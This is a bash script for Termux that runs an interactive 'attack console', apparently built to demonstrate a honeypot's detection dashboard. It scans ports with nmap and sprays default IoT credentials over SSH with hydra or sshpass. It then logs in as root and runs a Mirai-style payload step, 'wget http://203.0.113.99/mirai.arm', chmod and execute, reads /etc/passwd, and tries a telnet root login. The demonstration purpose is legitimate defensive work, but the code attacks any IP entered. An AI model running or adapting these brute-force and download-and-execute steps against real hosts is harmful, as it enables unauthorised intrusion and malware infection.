#!/usr/bin/env bash
# ============================================================================
#  SENTINEL // ATTACK CONSOLE   —  interactive red-team demo shell (Termux)
# ----------------------------------------------------------------------------
#  Just run it — it asks for the target, then drops you into a live console
#  where you fire attacks by number, one phase at a time, while you narrate
#  and the SENTINEL dashboard lights up.
#
#  FIRST TIME on the phone (Termux):
#    pkg update -y && pkg install -y hydra nmap sshpass openssh netcat-openbsd
#
#  RUN:
#    bash phone_attack.sh                 # asks for the target IP
#    bash phone_attack.sh <SENTINEL_IP>   # pre-fills the target
#
#  <SENTINEL_IP> = laptop wlan0 IP, printed by run.sh as "Cowrie SSH <IP>".
# ============================================================================

set -u

# ── Hacker palette ──────────────────────────────────────────────────
# ANSI-C quoting ($'…') stores REAL escape bytes, so the colours work both in
# echo -e AND when inserted into a sed replacement (plain '\033' strings do not
# survive sed and print as literal garbage).
G=$'\033[0;32m'   ; BG=$'\033[1;32m'   # green / bright green
DG=$'\033[2;32m'                        # dim green
R=$'\033[0;31m'   ; BR=$'\033[1;31m'    # red / bright red
CY=$'\033[0;36m'  ; YL=$'\033[1;33m'    # cyan / yellow
DIM=$'\033[2m'    ; BLINK=$'\033[5m'    ; RS=$'\033[0m'
CLR() { printf '\033[2J\033[H'; }      # clear screen

SSH_PORT=2222; TELNET_PORT=2223
TARGET="${1:-}"; LINK="?"

SSH_LEGACY="-oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null \
-oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 \
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -oConnectTimeout=6"

# ── FX helpers ──────────────────────────────────────────────────────
type_out() { local s="$1" i; for ((i=0;i<${#s};i++)); do printf "%b" "${s:$i:1}"; sleep 0.008; done; printf "\n"; }
rule()     { printf "${DG}"; printf '─%.0s' $(seq 1 46); printf "${RS}\n"; }
ok()       { echo -e "  ${BG}[✓]${RS} $1"; }
info()     { echo -e "  ${G}[*]${RS} $1"; }
warn()     { echo -e "  ${YL}[!]${RS} $1"; }
bad()      { echo -e "  ${BR}[x]${RS} $1"; }
loading()  { # loading dots animation:  loading "text"
  printf "  ${G}[*]${RS} %s" "$1"; local i
  for i in 1 2 3 4 5; do printf "${DG}.${RS}"; sleep 0.12; done; printf " ${BG}ok${RS}\n"
}

banner() {
  echo -e "${BG}"
  cat <<'ART'
   ╔══════════════════════════════════════════╗
   ║   ▄▄▄  ▄▄▄█  ▄▄  ▄  ▄█▄  SENTINEL         ║
   ║   ███  █▄▄   ██▄ █   █    A T T A C K      ║
   ║   ▀▀▀  ▀▀▀█  █ ▀▀█   █    C O N S O L E    ║
   ╚══════════════════════════════════════════╝
ART
  echo -e "${DG}        red-team demo shell  ·  v1.0${RS}\n"
}

boot() {
  CLR; banner
  loading "loading exploit modules"
  loading "arming mirai payloads"
  loading "spinning up c2 channel"
  echo ""
}

# ── IP validation + reachability ────────────────────────────────────
valid_ip() {
  local ip="$1"
  [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  local IFS='.'; read -r a b c d <<< "$ip"
  for o in "$a" "$b" "$c" "$d"; do (( o >= 0 && o <= 255 )) || return 1; done
  return 0
}

check_link() {
  if nc -z -w4 "$TARGET" "$SSH_PORT" 2>/dev/null; then LINK="ONLINE"; return 0
  else LINK="OFFLINE"; return 1; fi
}

ask_target() {
  while true; do
    echo -ne "  ${BG}target ip ▸${RS} "
    read -r TARGET
    if ! valid_ip "$TARGET"; then bad "'${TARGET}' is not a valid IPv4 address — try again"; continue; fi
    info "locking target ${CY}${TARGET}${RS}"
    loading "probing ${TARGET}:${SSH_PORT}"
    if check_link; then ok "target is ${BG}ONLINE${RS} — honeypot answering"; sleep 0.4; break
    else
      bad "target ${BR}OFFLINE${RS} on :${SSH_PORT}"
      warn "same hotspot? 'client isolation' OFF? SENTINEL running?"
      echo -ne "  ${G}retry this IP? [Y/n] ▸${RS} "; read -r yn
      [[ "$yn" =~ ^[Nn] ]] || { if check_link; then ok "now ONLINE"; break; fi; }
    fi
  done
}

# ── Credential list ─────────────────────────────────────────────────
CREDS=( "root:root" "root:admin" "root:123456" "admin:admin"
        "admin:password" "root:toor" "support:support" "root:12345"
        "admin:1234" "root:password" "user:user" "root:qwerty" )

# ── Attacks ─────────────────────────────────────────────────────────
atk_recon() {
  rule; echo -e "${BG} ▶ MODULE 01 · RECON${RS}  ${DG}// port sweep${RS}"; rule
  info "enumerating open services on ${CY}${TARGET}${RS}…"
  if command -v nmap >/dev/null 2>&1; then
    nmap -Pn -T4 --top-ports 50 "$TARGET" 2>/dev/null | grep -E "open|scanned" | sed "s/^/  ${G}▪${RS} /" || true
  else
    for p in 22 23 80 443 2222 2223 8080; do nc -z -w2 "$TARGET" "$p" 2>/dev/null && echo -e "  ${G}▪ open  $p${RS}"; done
  fi
  ok "recon complete"
  echo -e "  ${YL}▶ show on dashboard:${RS} recon traffic hitting SENTINEL"
}

atk_brute() {
  rule; echo -e "${BG} ▶ MODULE 02 · BRUTE-FORCE${RS}  ${DG}// credential spray${RS}"; rule
  info "spraying ${#CREDS[@]} default IoT credentials, Mirai-style…"
  if command -v hydra >/dev/null 2>&1; then
    printf '%s\n' "${CREDS[@]#*:}"        > /tmp/hp_pw.txt
    printf '%s\n' "${CREDS[@]%%:*}" | sort -u > /tmp/hp_us.txt
    hydra -L /tmp/hp_us.txt -P /tmp/hp_pw.txt -t 4 -o /dev/null \
      "ssh://${TARGET}:${SSH_PORT}" 2>/dev/null | grep -E "login:" | sed "s/^/  ${BR}CRACKED ▸${RS} /" || true
  else
    for pair in "${CREDS[@]}"; do u="${pair%%:*}"; p="${pair#*:}"
      sshpass -p "$p" ssh $SSH_LEGACY -p "$SSH_PORT" "${u}@${TARGET}" "exit" 2>/dev/null
      echo -e "  ${DG}try ${u}:${p}${RS}"; done
  fi
  ok "credential-stuffing run complete"
  echo -e "  ${YL}▶ show on dashboard:${RS} ${BG}Threats${RS} filling (SEV 5) + captured creds"
}

atk_breakin() {
  rule; echo -e "${BG} ▶ MODULE 03 · EXPLOIT${RS}  ${DG}// root shell + payload${RS}"; rule
  info "authenticating as root…"
  sshpass -p 's3cr3t' ssh $SSH_LEGACY -tt -p "$SSH_PORT" "root@${TARGET}" 2>/dev/null <<'CMDS' || true
uname -a
cat /proc/cpuinfo | head
wget http://203.0.113.99/mirai.arm
chmod +x mirai.arm
./mirai.arm
cat /etc/passwd
exit
CMDS
  if nc -z -w3 "$TARGET" "$TELNET_PORT" 2>/dev/null; then
    (sleep 1; echo "root"; sleep 1; echo "root"; sleep 1) | nc -w5 "$TARGET" "$TELNET_PORT" >/dev/null 2>&1 || true
  fi
  echo -e "${BR}"
  cat <<'ART'
      ┌────────────────────────────────┐
      │   ██  ROOT ACCESS GRANTED  ██   │
      └────────────────────────────────┘
ART
  echo -e "${RS}"
  ok "malware download + recon commands executed"
  echo -e "  ${YL}▶ show on dashboard:${RS} ${BG}SEV 8${RS} breach → ${BG}Firewall${RS} auto-block fires"
}

atk_verify() {
  rule; echo -e "${BG} ▶ MODULE 04 · VERIFY${RS}  ${DG}// am I blocked?${RS}"; rule
  info "attacker attempts to reconnect…"
  loading "knocking on ${TARGET}:${SSH_PORT}"
  if nc -z -w6 "$TARGET" "$SSH_PORT" 2>/dev/null; then
    warn "still reachable — if this is a real 2nd device, its IP is now dropped"
    warn "(self-attack stays 'logical' by the safety guard — show the rule)"
  else
    echo -e "  ${BG}[✓] CONNECTION REFUSED — attacker is blocked.${RS}"
  fi
  echo -e "  ${YL}▶ show on dashboard:${RS} attacker IP in ${BG}Firewall${RS} · ${BG}Enforced${RS} badge"
}

run_all() { atk_recon; echo; atk_brute; echo; atk_breakin; echo; atk_verify; }

# ── Menu ────────────────────────────────────────────────────────────
menu() {
  echo ""
  rule
  echo -e "${BG}  ATTACK MODULES${RS}                          ${DIM}pick one${RS}"
  rule
  echo -e "   ${BG}[1]${RS} recon       ${DG}· port scan${RS}"
  echo -e "   ${BG}[2]${RS} bruteforce  ${DG}· credential spray${RS}"
  echo -e "   ${BG}[3]${RS} exploit     ${DG}· root shell + malware${RS}"
  echo -e "   ${BG}[4]${RS} verify      ${DG}· confirm the block${RS}"
  echo -e "   ${BG}[5]${RS} full-auto   ${DG}· run every phase${RS}"
  echo ""
  echo -e "   ${CY}[t]${RS} target      ${DG}· change / recheck IP${RS}"
  echo -e "   ${R}[0]${RS} exit"
  rule
  local dot="${BG}●${RS}"; [ "$LINK" = "OFFLINE" ] && dot="${BR}●${RS}"
  echo -e "  target ${CY}${TARGET}${RS}   link ${dot} ${LINK}"
}

# ── Main ────────────────────────────────────────────────────────────
boot
if [ -n "$TARGET" ] && valid_ip "$TARGET"; then
  info "target preset: ${CY}${TARGET}${RS}"; loading "probing ${TARGET}"; check_link \
    && ok "ONLINE" || warn "OFFLINE — use [t] to fix"
else
  ask_target
fi

while true; do
  menu
  echo -ne "\n  ${BG}root@sentinel${RS}:${CY}~${RS}# "
  read -r c
  case "$c" in
    1) atk_recon ;;
    2) atk_brute ;;
    3) atk_breakin ;;
    4) atk_verify ;;
    5) run_all ;;
    t|T) ask_target ;;
    0|q|Q|exit) echo -e "\n  ${DG}connection closed.${RS}\n"; exit 0 ;;
    "") : ;;
    *) bad "unknown command '${c}' — pick 1-5, t, or 0" ;;
  esac
  echo -ne "\n  ${DIM}press Enter to return to console…${RS}"; read -r _
  CLR; banner
done
